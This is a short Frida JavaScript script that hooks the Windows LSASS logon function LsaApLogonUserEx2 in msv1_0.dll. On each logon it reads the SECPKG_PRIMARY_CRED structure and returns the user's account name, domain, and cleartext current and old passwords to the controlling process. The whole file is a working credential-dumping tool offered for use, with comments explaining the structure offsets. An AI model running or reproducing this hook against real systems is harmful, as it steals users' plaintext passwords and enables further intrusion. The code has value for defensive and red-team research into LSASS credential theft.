// Hook LsaApLogonUserEx2() and dump credentials from user authentication.

var msv = Process.getModuleByName("msv1_0.DLL");
var logonUser = msv.getExportByName("LsaApLogonUserEx2");

function parsePrimaryCredentials(ptr) {
	// Parse the SECPKG_PRIMARY_CRED structure pass to LsaApLogonUserEx2. 64-bit only.
	// Input: a pointer to the SECPKG_PRIMARY_CRED structure to be parsed.
	
	var size_luid = 0x8; // https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/igpupvdev/ns-igpupvdev-_luid
	var size_unicode_string = 0x10; // https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/shared/ntdef/unicode_string.htm
	
	// Reference for struct members:
	// https://docs.microsoft.com/en-us/windows/win32/api/ntsecpkg/ns-ntsecpkg-secpkg_primary_cred

	// Calculate the address of each member by adding the sizeof the previous member.
	var logonId = ptr;
	var downLevelName = logonId.add ( size_luid );
	var domainName = downLevelName.add( size_unicode_string );
	var password = domainName.add( size_unicode_string );
	var oldPassword = password.add( size_unicode_string );

	// Read the length from each unicode string. Divide by 2 because we are reading UTF 16 strings.
	// Length is located at offset 0x0 in the UNICODE_STRING struct.
	var downLevelNameLength = downLevelName.readUShort() / 2;
	var domainNameLength = domainName.readUShort() / 2;
	var passwordLength = password.readUShort() / 2;
	var oldPasswordLength = oldPassword.readUShort() / 2;

	// Use the length values to read the correct number of bytes from each unicode string.
	// Buffer is located at offset 0x8 in the UNICODE_STRING struct.
	var downLevelNameBuffer = downLevelName.add(0x8).readPointer().readUtf16String(downLevelNameLength);
	var domainNameBuffer = domainName.add(0x8).readPointer().readUtf16String(domainNameLength);
	var passwordBuffer = password.add(0x8).readPointer().readUtf16String(passwordLength);
	var oldPasswordBuffer = oldPassword.add(0x8).readPointer().readUtf16String(oldPasswordLength);

	//Return results.
	var output = {
		"sam_account": downLevelNameBuffer,
		"domain": domainNameBuffer,
		"password": passwordBuffer,
		"old_password": oldPasswordBuffer
	}
	return output;
}

Interceptor.attach(logonUser, {
	onEnter: function(args) {
		// https://docs.microsoft.com/en-us/windows/win32/api/ntsecpkg/nc-ntsecpkg-lsa_ap_logon_user_ex2
		this.primaryCredentials = args[14];
	},
	onLeave: function(retval) {
		var output = parsePrimaryCredentials(this.primaryCredentials);
		send(output);
	}
});
